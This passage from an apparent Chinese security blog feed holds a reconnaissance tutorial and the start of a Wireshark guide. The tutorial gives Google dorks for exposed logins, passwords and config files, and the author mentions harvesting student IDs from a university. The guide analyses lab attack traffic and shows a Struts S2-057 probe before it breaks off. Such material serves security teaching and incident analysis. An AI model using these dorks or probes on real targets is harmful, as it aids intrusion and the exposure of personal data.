收集子域名的利用</h3><p><strong>子域名去重：</strong></p><p>因为我们使用了多个工具收集子域名，收集的信息肯定会有很多重复之处，此时可以使用pydictor这个工具去重</p><p>将所有需要合并去重的txt文件放到test目录下，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -tool uniqbiner .\test\</span><br></pre></td></tr></table></figure><p><img src="2.4.1.png" alt="2.4.1"></p><p>最终在results目录下即可找到合并去重的文件内容。输出位置也可以使用 -o 指定</p><p><strong>子域名批量识别：</strong></p><p>收集到的子域名，在大型站点中通常会很多，一个一个检测太过麻烦，比较优雅的方法是，使用工具批量识别title头，或者根据子域名名称来判断站点重要性。如（vpn，login，email等子域名一眼看过去就感觉很有价值）</p><p>批量识别工具：<a href="https://github.com/TheKingOfDuck/domain_screen">https://github.com/TheKingOfDuck/domain_screen</a></p><p>工具有点问题，后面修一下。</p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>批量识别title信息：</p><p><a href="http://www.link114.cn/title">http://www.link114.cn/title</a></p><p>批量识别ip及运营商：</p><p><a href="https://zh.infobyip.com/ipbulklookup.php">https://zh.infobyip.com/ipbulklookup.php</a></p><h1 id="3-真实ip发现"><a href="#3-真实ip发现" class="headerlink" title="3. 真实ip发现"></a>3. 真实ip发现</h1><p>目前很多大型网站都使用了cdn服务，这就导致直接ping域名得到的ip可能不是真实ip。</p><p>cdn本身不是为了安全防御，但在一定程度上能够抵御安全攻击。因为直接访问的是cdn服务器，sql注入，命令执行之类的漏洞都是在cdn服务器上面执行，但是cdn服务器只是缓存了静态资源，并没有漏洞程序，所以在对具有cdn的服务器进行攻击时，漏洞可能无法利用成功。（个人理解，这方面一直不太熟，后面研究研究）</p><h3 id="TODO-1"><a href="#TODO-1" class="headerlink" title="TODO"></a>TODO</h3><p><a href="https://mp.weixin.qq.com/s/BKR8mpxMSOwPhkkdB8Cqsg"><strong>最后的Bypass CDN 查找网站真实IP</strong></a></p><p>这篇文章说的 很不错，推荐看一下</p><h1 id="4-cms，中间件信息收集"><a href="#4-cms，中间件信息收集" class="headerlink" title="4. cms，中间件信息收集"></a>4. cms，中间件信息收集</h1><p>在渗透测试时，如果能够快速识别出cms和中间件信息，能够直接秒杀。</p><p>常规cms识别的方法：</p><ul><li>云悉识别 </li><li>wappalyzer 插件</li><li>佩恩平台识别</li><li>潮汐指纹识别</li><li>kali whatweb</li></ul><h3 id="4-1-云悉指纹识别"><a href="#4-1-云悉指纹识别" class="headerlink" title="4.1.云悉指纹识别"></a>4.1.云悉指纹识别</h3><p>最好用的应该是云悉平台的指纹识别，但是云悉平台需要邀请码….邀请码有点难弄到</p><p><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p><img src="4.1.1.png" alt="4.1.1"></p><h3 id="4-2-wappalyzer-插件"><a href="#4-2-wappalyzer-插件" class="headerlink" title="4.2.wappalyzer 插件"></a>4.2.wappalyzer 插件</h3><p><a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?utm_source=chrome-ntp-icon">https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?utm_source=chrome-ntp-icon</a></p><p><img src="4.2.1.png" alt="4.2.1"></p><p>像我老师网站，信息直接全部暴露~（主要是他的博客是我见过wappalyzer 识别信息最全的….wappalyzer 插件针对国内cms有点水土不服)</p><p>顺便给他项目打个广告：</p><p><a href="https://github.com/zhblue/hustoj">https://github.com/zhblue/hustoj</a></p><h3 id="4-3-佩恩平台识别"><a href="#4-3-佩恩平台识别" class="headerlink" title="4.3 佩恩平台识别"></a>4.3 佩恩平台识别</h3><p>需要投稿四篇才有初级使用权限….</p><p>不足四篇也可以搜索别人搜索过的资产，例如baidu.com。这个信息收集绝对是最全的……</p><p><img src="4.3.1.png" alt="4.3.1"></p><h3 id="4-4-潮汐指纹识别"><a href="#4-4-潮汐指纹识别" class="headerlink" title="4.4 潮汐指纹识别"></a>4.4 潮汐指纹识别</h3><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><h3 id="4-5-whatweb"><a href="#4-5-whatweb" class="headerlink" title="4.5 whatweb"></a>4.5 whatweb</h3><p><img src="4.5.1.png" alt="4.5.1"></p><p>whatweb对国外cms，如：wordpress，joomla等国外cms识别效果还是不错的。但是遇到国内的cms，如tp框架，dz等cms效果就不好了…</p><h2 id="4-6-cms信息的利用"><a href="#4-6-cms信息的利用" class="headerlink" title="4.6 cms信息的利用"></a>4.6 cms信息的利用</h2><p>识别了cms，快速找出对应cms的爆发过的漏洞，进行验证</p><p>快速找出cms漏洞方法有：</p><ul><li>零组知识库查找</li><li>cnvd 国家信息安全共享平台查找</li><li>cve搜索</li><li>知识库搜索</li></ul><h3 id="4-6-1零组知识库信息"><a href="#4-6-1零组知识库信息" class="headerlink" title="4.6.1零组知识库信息"></a>4.6.1零组知识库信息</h3><p>基本所有公开的cms漏洞，利用方式都能从这里找到。</p><p>网站：<a href="https://wiki.0-sec.org/#/md%EF%BC%88%E9%9C%80%E8%A6%81%E9%82%80%E8%AF%B7%E7%A0%81%EF%BC%8C%E6%88%91%E8%BF%98%E6%9C%89%E4%B8%80%E6%9E%9A...%EF%BC%89">https://wiki.0-sec.org/#/md（需要邀请码，我还有一枚...）</a></p><p><img src="4.6.1.1.png" alt="4.6.1.1"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="4-6-2-cnvd查找cms漏洞"><a href="#4-6-2-cnvd查找cms漏洞" class="headerlink" title="4.6.2 cnvd查找cms漏洞"></a>4.6.2 cnvd查找cms漏洞</h3><p><a href="https://www.cnvd.org.cn/flaw/list.htm?flag=true">https://www.cnvd.org.cn/flaw/list.htm?flag=true</a></p><p><img src="4.6.2.1.png" alt="4.6.2.1"></p><h3 id="4-6-3-相关cve搜索"><a href="#4-6-3-相关cve搜索" class="headerlink" title="4.6.3 相关cve搜索"></a>4.6.3 相关cve搜索</h3><p><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a></p><p><img src="4.6.3.1.png" alt="4.6.3.1"></p><h3 id="4-6-4-安恒知识库搜索"><a href="#4-6-4-安恒知识库搜索" class="headerlink" title="4.6.4 安恒知识库搜索"></a>4.6.4 安恒知识库搜索</h3><p>大佬们写了几千篇文章，基本什么类型的cms，都有：</p><p><a href="http://greatagain.dbappsecurity.com.cn/#/book?id=1072&amp;type_id=1">http://greatagain.dbappsecurity.com.cn/#/book?id=1072&amp;type_id=1</a></p><p><img src="4.6.4.1.png" alt="4.6.4.1"></p><h1 id="5-路径敏感信息收集"><a href="#5-路径敏感信息收集" class="headerlink" title="5. 路径敏感信息收集"></a>5. 路径敏感信息收集</h1><p>路径扫描主要靠工具收集。常用的有工具有：</p><ul><li>awvs13 爬虫，爬取路径</li><li>dirbuster</li><li>dirsearch (后面课程会讲到这个工具)</li><li>御剑</li><li>javascript文件中的链接提取（真的好用）</li></ul><h3 id="5-1-awvs13爬虫探测"><a href="#5-1-awvs13爬虫探测" class="headerlink" title="5.1 awvs13爬虫探测"></a>5.1 awvs13爬虫探测</h3><h3 id="5-2-dirbuster"><a href="#5-2-dirbuster" class="headerlink" title="5.2 dirbuster"></a>5.2 dirbuster</h3><p><img src="5.2.1.png" alt="5.2.1"></p><p>dirbuster比较好的点就是能够可视化的看到，爆破出来的路径，还可以自由勾选要枚举的路径，还有设置代理之类的功能，总体还是蛮好用的。</p><p>爆破结果：</p><p><img src="5.2.2.png" alt="5.2.2"></p><h3 id="5-3-dirsearch-后面课程要用…"><a href="#5-3-dirsearch-后面课程要用…" class="headerlink" title="5.3 dirsearch(后面课程要用…)"></a>5.3 dirsearch(后面课程要用…)</h3><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>因为是国外的工具，自带的字典在国内都不太好用，可以根据该文章修改一下字典：<a href="https://dfkan.com/1469.html">https://dfkan.com/1469.html</a></p><p>简单爆破一下路径:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://www.hustoj.com/ -e php</span><br></pre></td></tr></table></figure><h3 id="5-4-御剑（上古级神器了，线程一开大，就容易卡死…"><a href="#5-4-御剑（上古级神器了，线程一开大，就容易卡死…" class="headerlink" title="5.4 御剑（上古级神器了，线程一开大，就容易卡死…)"></a>5.4 御剑（上古级神器了，线程一开大，就容易卡死…)</h3><p><img src="5.4.1.png" alt="5.4.1"></p><p>也不支持代理，简单了解即可…</p><h3 id="5-5-javascript文件中的链接提取（真的好用）"><a href="#5-5-javascript文件中的链接提取（真的好用）" class="headerlink" title="5.5 javascript文件中的链接提取（真的好用）"></a>5.5 javascript文件中的链接提取（真的好用）</h3><p><strong>jsfinder提取url:</strong></p><p><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><p>该工具能够爬取指定网站中所有的js文件，并查找其中的路径</p><p><img src="5.5.1.png" alt="5.5.1"></p><p><strong>LinkFinder 提取节点</strong></p><p><a href="https://github.com/GerbenJavado/LinkFinder">https://github.com/GerbenJavado/LinkFinder</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 linkfinder.py -i http://www.hustoj.com/ -d -o test.html</span><br></pre></td></tr></table></figure><p>提取效果还是不错的。</p><p><img src="5.5.2.png" alt="5.5.2"></p><h1 id="6-搜索引擎敏感信息收集"><a href="#6-搜索引擎敏感信息收集" class="headerlink" title="6.搜索引擎敏感信息收集"></a>6.搜索引擎敏感信息收集</h1><p>搜索引擎在使用特定语法时能够，收集到很多敏感信息</p><h3 id="6-1-googlehacking"><a href="#6-1-googlehacking" class="headerlink" title="6.1 googlehacking"></a>6.1 googlehacking</h3><p>这里因为篇幅问题主要记录google搜索语法。在很多时候使用 百度，必应也有意想不到的效果。</p><p><strong>site: 限制域名的搜索范围</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com</span><br></pre></td></tr></table></figure><p><strong>inurl：用于搜索含有特定值的url</strong></p><p>在搜索一些通用cms漏洞时特别好用。cms通用漏洞，url都是固定的，直接搜索很容易找到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:/phpinfo.php</span><br></pre></td></tr></table></figure><p>也可用来发现后台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br></pre></td></tr></table></figure><p><strong>intext：搜索网页中包含的文字（忽略，title，url等）</strong></p><p>intext主要用来配合site，搜索指定网站中存在的敏感信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</span><br></pre></td></tr></table></figure><p><strong>filetype：搜索文件的后缀或者扩展名</strong></p><p>filetype常用来和site组合使用，通过添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:cuz.edu.cn filetype:xls</span><br></pre></td></tr></table></figure><p>收获一堆学号用户名….淦，可怜的文学院。</p><p><img src="6.1.1.png" alt="6.1.1"></p><p>常搜索的后缀：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xls|txt|docx|pptx|pdf|sql|mdb|zip|rar</span><br></pre></td></tr></table></figure><p><strong>intitle：搜索指定的title标题</strong></p><p>intitle常用来搜索诸如，后台|login|管理 之类的关键字，可用来快速发现后台系统。</p><p>常用关键字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">管理|login|后台|登陆|注册|register|admin|等</span><br></pre></td></tr></table></figure><p><strong>link：搜索包含了某个指定url的页面列表</strong></p><p>link可以用来收集子域名，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com link:baidu.com -www</span><br></pre></td></tr></table></figure><h4 id="6-1-7-常用搜索组合："><a href="#6-1-7-常用搜索组合：" class="headerlink" title="6.1.7 常用搜索组合："></a>6.1.7 常用搜索组合：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line">查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</span><br><span class="line"></span><br><span class="line">查找可注入点：site:域名 inurl:aspx|jsp|php|asp</span><br><span class="line"></span><br><span class="line">查找上传漏洞：site:域名 inurl:file|load|editor|Files</span><br><span class="line"></span><br><span class="line">找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</span><br><span class="line"></span><br><span class="line">存在的数据库：site:域名 filetype:mdb|asp|#</span><br><span class="line"></span><br><span class="line">查看脚本类型：site:域名 filetype:asp/aspx/php/jsp</span><br><span class="line"></span><br><span class="line">迂回策略入侵：inurl:cms/data/templates/images/index/</span><br></pre></td></tr></table></figure><hr><h4 id="6-1-8-各种敏感数据收集："><a href="#6-1-8-各种敏感数据收集：" class="headerlink" title="6.1.8 各种敏感数据收集："></a>6.1.8 各种敏感数据收集：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">filetyle:xls inurl:gov username password</span><br><span class="line"></span><br><span class="line">inurl:phpmyadmin/main.php intitle:phpmyadmin</span><br><span class="line"></span><br><span class="line">filetype:inc inurl:config.inc host</span><br><span class="line"></span><br><span class="line">filetype:sql cdb_members inurl:forumdata</span><br><span class="line"></span><br><span class="line">filetype:txt inurl:&quot;新建文本文档.txt&quot;密码</span><br><span class="line"></span><br><span class="line">inurl:phpinfo.php intitle:&quot;phpinfo()&quot;&quot;PHP Version&quot;+&quot;Server API&quot;</span><br><span class="line"></span><br><span class="line">filetype:log inurl:log mdb</span><br></pre></td></tr></table></figure><h3 id="6-2-网盘信息搜索（这个很强）"><a href="#6-2-网盘信息搜索（这个很强）" class="headerlink" title="6.2 网盘信息搜索（这个很强）"></a>6.2 网盘信息搜索（这个很强）</h3><p>网盘搜索网上没看到有多少人提，第一次知道还是来自安恒一个师傅教的，亲自看大佬，信息收集进某高校内网。</p><p>因为某度网盘的广泛使用，网盘中可能会存储很多敏感信息。</p><p>这里主要使用凌风云搜索：<a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><p>成堆的学号，用户名….恐怖如斯好吧…</p><p><img src="6.2.1.png" alt="6.2.1"></p><p>其他的网盘搜索 引擎：<a href="https://www.chaonengsou.com/%E3%80%82%E8%BF%99%E4%B8%AA%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%9F%E5%B0%B1%E6%98%AFiframe%E5%B5%8C%E5%A5%97%E4%BA%86%E5%85%B6%E4%BB%96%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8B%E3%80%82%E5%8F%8D%E6%AD%A3%E5%87%8C%E9%A3%8E%E4%BA%91%F0%9F%90%AE%F0%9F%8D%BA%E3%80%82">https://www.chaonengsou.com/。这个搜索引擎也就是iframe嵌套了其他搜索引擎，也可以尝试一下。反正凌风云🐮🍺。</a></p><h1 id="7-github信息收集"><a href="#7-github信息收集" class="headerlink" title="7. github信息收集"></a>7. github信息收集</h1><p>很多程序员，会将自己为企业开发的代码直接上传到github。代码中的，敏感信息，配置文件等都没有更改。攻击者很容易就可以通过，域名，作者id等信息在github搜索到源码。</p><h3 id="7-1-github常用语法"><a href="#7-1-github常用语法" class="headerlink" title="7.1 github常用语法"></a>7.1 github常用语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">in:name  test              #仓库标题搜索含有关键字 test</span><br><span class="line">in:descripton test         #仓库描述搜索含有关键字</span><br><span class="line">in:readme test             #Readme文件搜素含有关键字</span><br></pre></td></tr></table></figure><p>尝试搜索一下赵师傅的项目：</p><p>in:name glzjin</p><p><img src="7.1.1.png" alt="7.1.1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:ccjpp       #搜索指定用户名的所有代码</span><br></pre></td></tr></table></figure><p><img src="7.1.2.png" alt="7.1.2"></p><p>写过的所有渣代码暴露….</p><h3 id="7-2-搜索敏感信息"><a href="#7-2-搜索敏感信息" class="headerlink" title="7.2 搜索敏感信息"></a>7.2 搜索敏感信息</h3><p>这篇文章总结的很好：<a href="https://www.onebug.org/websafe/75924.html">信息收集之Github搜索语法</a></p><p>简单演示：</p><p>随便尝试一下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:qq.com String password smtp</span><br></pre></td></tr></table></figure><p><img src="7.2.1.png" alt="7.2.1"></p><p>一个信息收集工具：<a href="https://xz.aliyun.com/t/7229">GitHub敏感信息采集工具GSIL</a></p><h1 id="8-dns信息收集"><a href="#8-dns信息收集" class="headerlink" title="8. dns信息收集"></a>8. dns信息收集</h1><p>没试过dns信息收集，不会</p><h2 id="TODO-2"><a href="#TODO-2" class="headerlink" title="TODO"></a>TODO</h2><p>可以参考链接：</p><p><a href="https://www.jianshu.com/p/70ecbbcb52ac">渗透时常用的DNS信息收集</a></p><p><a href="https://zhuanlan.zhihu.com/p/110404620">https://zhuanlan.zhihu.com/p/110404620</a></p><h1 id="9-邮件信息收集"><a href="#9-邮件信息收集" class="headerlink" title="9. 邮件信息收集"></a>9. 邮件信息收集</h1><p>找邮件，目前只知道whois查询，网页中提取含有邮箱格式（xxx@xxx格式）的参数，或者google，github信息收集也许也能收集到。</p><p>参考链接：</p><p><a href="https://www.jianshu.com/p/83b2fdf71e4c">收集的一些谷歌黑客语法</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wireshark使用</title>
      <link href="/2019/07/05/wireshark%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%AE%9E%E5%88%97%E8%AE%B2%E8%A7%A3/"/>
      <url>/2019/07/05/wireshark%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%AE%9E%E5%88%97%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>本文首发于雷神众测：</p><p><a href="https://mp.weixin.qq.com/s/u04nDndGZFEFko9lRp6Frg">https://mp.weixin.qq.com/s/u04nDndGZFEFko9lRp6Frg</a></p><p>最近在HW，主要工作就是判断各个设备日志，分析数据包，对wireshark数据包分析不太熟悉，特此学习记录一下。本想再对主流扫描器和webshell管理工具抓包分析，但碍于篇幅和自己时间问题，没有再深入下去。这里主要挑选了weblogic反序列化，ms17_010，struts s2-057数据包进行实列分析。希望文章能对给位师傅有所帮助，文章中可能有很多不足和错误之处，还望各位师傅包含。</p><h1 id="1-wireshark抓包"><a href="#1-wireshark抓包" class="headerlink" title="1.wireshark抓包"></a>1.wireshark抓包</h1><h2 id="1-1选择监听网卡"><a href="#1-1选择监听网卡" class="headerlink" title="1.1选择监听网卡"></a>1.1选择监听网卡</h2><p>捕获–&gt;选项</p><p><img src="1.1.1.png" alt="1.1.1"></p><p>我这里要查看我wlan的流量，所以选择wlan。</p><h2 id="1-2-显示面板介绍"><a href="#1-2-显示面板介绍" class="headerlink" title="1.2 显示面板介绍"></a>1.2 显示面板介绍</h2><p><img src="1.1.2.png" alt="1.1.2"></p><p><strong>数据包列表</strong>：</p><p>不同的协议会显示不同的颜色，方便区分。</p><p><strong>数据包详细信息</strong>：</p><p>frame:物理层的数据帧概况</p><p>ethernet:数据链路层以太网帧头部信息</p><p>internet protocol version 4:互联网层ip包头部信息</p><p>transmission control protocol：传输层T的数据段头部信息，此处是tcp</p><p>hypertext transfer protocol：应用层的信息，此处是http协议</p><p><strong>16进制数据：</strong></p><p>点击数据包详细信息数据区域的数据，在16进制数据区域中会显示对应的数据。个人理解数据包详细信息区是wireshark处理之后方便我们查看的数据包，而16进制数据包区域是实际在网络中传输的数据包。</p><p><img src="1.1.3.png" alt="1.1.3"></p><h1 id="2-过滤条件介绍"><a href="#2-过滤条件介绍" class="headerlink" title="2.过滤条件介绍"></a>2.过滤条件介绍</h1><h2 id="2-1协议过滤"><a href="#2-1协议过滤" class="headerlink" title="2.1协议过滤"></a>2.1协议过滤</h2><p>tcp，icmp，http，udp…</p><p>单独输入只显示对应的协议数据包列表，列如：输入http</p><p><img src="2.1.1.png" alt="2.1.1"></p><h2 id="2-2-ip过滤"><a href="#2-2-ip过滤" class="headerlink" title="2.2 ip过滤"></a>2.2 ip过滤</h2><p> ip.src==120.241.148.154 显示源地址为120.241.148.154 的数据包列表</p><p>  ip.dst==120.241.148.154 , 显示目标地址为120.241.148.154 的数据包列表</p><p>  ip.addr == 120.241.148.154 显示源IP地址或目标IP地址为120.241.148.154的数据包列表</p><p><img src="2.2.1.png" alt="2.2.1"></p><h2 id="2-3-端口过滤"><a href="#2-3-端口过滤" class="headerlink" title="2.3 端口过滤"></a>2.3 端口过滤</h2><p> tcp.port ==80, 显示源主机或者目的主机端口为80的数据包列表。</p><p> tcp.srcport == 80, 只显示TCP协议的源主机端口为80的数据包列表。</p><p> tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。</p><p><img src="2.3.1.png" alt="2.3.1"></p><h2 id="2-4-http模式过滤"><a href="#2-4-http模式过滤" class="headerlink" title="2.4 http模式过滤"></a>2.4 http模式过滤</h2><p>http.request.method==”GET”，只显示HTTP GET方法</p><p>http.request.method==”POST”</p><p><img src="2.4.1.png" alt="2.4.1"></p><h2 id="2-5-逻辑运算符-and-or-not"><a href="#2-5-逻辑运算符-and-or-not" class="headerlink" title="2.5 逻辑运算符 and/or/not"></a>2.5 逻辑运算符 and/or/not</h2><p>http.request.method==”POST” and ip.src==192.168.71.249</p><p>只显示192.168.71.249发送的post数据。</p><p><img src="2.5.1.png" alt="2.5.1"></p><h2 id="2-6-固定特征检索"><a href="#2-6-固定特征检索" class="headerlink" title="2.6 固定特征检索"></a>2.6 固定特征检索</h2><p><img src="2.6.1.png" alt="2.6.1"></p><p>选中要cookie（可以选择为恶意的payload）右击，作为过滤器应用–&gt;选中</p><p>则只会显示cookie为选择值的数据包。</p><p><img src="2.6.2.png" alt="2.6.2"></p><h1 id="3-实列"><a href="#3-实列" class="headerlink" title="3.实列"></a>3.实列</h1><h2 id="3-1-Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#3-1-Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="3.1 Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>3.1 Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h2><p>docker搭建cve-2018-2628靶机，wireshar保存数据包分析。</p><p>docker地址：<a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2628/">https://vulhub.org/#/environments/weblogic/CVE-2018-2628/</a></p><h4 id="3-1-1查看恶意ip和受害ip的数据通信"><a href="#3-1-1查看恶意ip和受害ip的数据通信" class="headerlink" title="3.1.1查看恶意ip和受害ip的数据通信"></a>3.1.1查看恶意ip和受害ip的数据通信</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src==192.168.80.1 and ip.dst==192.168.80.4</span><br></pre></td></tr></table></figure><p><img src="3.1.1.png" alt="3.1.1"></p><h4 id="3-1-2-依次查看数据包"><a href="#3-1-2-依次查看数据包" class="headerlink" title="3.1.2 依次查看数据包"></a>3.1.2 依次查看数据包</h4><p>发现192.168.80.1想192.168.80.4发送了很多个2798长度的数据包，将数据包内容复制出来查看</p><p><img src="3.1.2.png" alt="3.1.2"></p><p>鼠标右键点击数据包内容，选择 as printable text即可将数据包内容复制到剪切板，将数据包复制到文本编辑器查看</p><p><img src="3.1.3.png" alt="3.1.3"></p><p>ysoserial.jar，touch /tmp/h11ba1.txt 可以大致确定攻击者使用了ysoserial工具进行了反序列化攻击，准备在服务器执行”touch /tmp/h11ba1.txt”命令。</p><h2 id="3-2-ms17-010"><a href="#3-2-ms17-010" class="headerlink" title="3.2 ms17-010"></a>3.2 ms17-010</h2><h3 id="3-2-1-确定攻击是否发生"><a href="#3-2-1-确定攻击是否发生" class="headerlink" title="3.2.1 确定攻击是否发生"></a>3.2.1 确定攻击是否发生</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr==192.168.80.4 and ip.addr==192.168.80.8 and smb</span><br></pre></td></tr></table></figure><p>因为ms17-010主要通过smb端口，所以先看smb协议</p><p><img src="3.2.1.png" alt="3.2.1"></p><p>发现192.168.80.4这个ip向192.168.80.8发送了大量的A字节。推测在进行溢出操作。所以确定发送ms17_010攻击</p><h3 id="3-2-2-确定是否成功"><a href="#3-2-2-确定是否成功" class="headerlink" title="3.2.2 确定是否成功"></a>3.2.2 确定是否成功</h3><p>继续查看数据包，发现数据包中含有session setup and request数据包，并且数据包中含有被攻击机器的准确域信息，说明攻击成功。</p><p><img src="3.2.2.png" alt="3.2.2"></p><h3 id="3-2-3-确定攻击者执行了那些命令"><a href="#3-2-3-确定攻击者执行了那些命令" class="headerlink" title="3.2.3 确定攻击者执行了那些命令"></a>3.2.3 确定攻击者执行了那些命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr==192.168.80.4 and ip.addr==192.168.80.8 and tcp</span><br></pre></td></tr></table></figure><p>分析192.168.80.4与192.168.80.8之间传输的所有tcp数据流</p><p>从上往下依次查看，发现，被标黑的数据包中含有cmd命令行，重点查看标黑的数据流。并且可以确定攻击者通过4444端口来接收受害者的shell。</p><p><img src="3.2.3.png" alt="3.2.3"></p><p>依次往下面查看，发现受害者192.168.80.8向攻击者192.168.80.4发送了自己的盘符信息。此时可以确定攻击者拥有了受害者cmd控制权。</p><p><img src="3.2.4.png" alt="3.2.4"></p><p>依次往后面查看，发现攻击者执行了，whoami,ipconfig /all，net user /domain，dir等命令。并且受害者返回执行结果</p><p><img src="3.2.5.png" alt="3.2.5"></p><p>鼠标右键点击—&gt;选择as printable text，将数据包提取出来，复制到sublime中可以更清晰的查看</p><p><img src="3.2.6.png" alt="3.2.6"></p><h2 id="3-3-Struts2-S2-057-Remote-Code-Execution-Vulnerablity-CVE-2018-11776"><a href="#3-3-Struts2-S2-057-Remote-Code-Execution-Vulnerablity-CVE-2018-11776" class="headerlink" title="3.3 Struts2 S2-057 Remote Code Execution Vulnerablity(CVE-2018-11776)"></a>3.3 Struts2 S2-057 Remote Code Execution Vulnerablity(CVE-2018-11776)</h2><p>struts s2-057主要通过GET请求发起攻击，只查看GET请求的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;GET&quot;</span><br></pre></td></tr></table></figure><p><img src="3.3.1.png" alt="3.3.1"></p><h3 id="3-3-1-poc验证漏洞"><a href="#3-3-1-poc验证漏洞" class="headerlink" title="3.3.1 poc验证漏洞"></a>3.3.1 poc验证漏洞</h3><p>攻击者先采用poc:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/$</span><span class="bash">%7B(111+111)%7D/actionChain1.action</span></span><br></pre></td></tr></table></figure><p>探测是否存在struts s2-057漏洞，跟踪http流查看漏洞是否存在</p><p> <img src="3.3.2.png" alt="3.3.2"></p><p>表达式执行成功，说明该漏洞存在，接下来查看攻击者利用该漏洞做了什么</p><h3 id="3-3-2-查看攻击者利用漏洞做了什么"><a href="#3-3-2-查看攻击者利用漏洞做了什么" class="headerlink" title="3.3.2 查看攻击者利用漏洞做了什么"></a>3.3.2 查看攻击者利用漏洞做了什么</h3><p>查看最后一个http流，发现存在bash字样，跟踪http流查看</p><p><img src="3.3.3.png" alt="3.3.3"></p><p>payload url解码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/struts2-showcase/$</span><span class="bash">&#123;</span></span><br><span 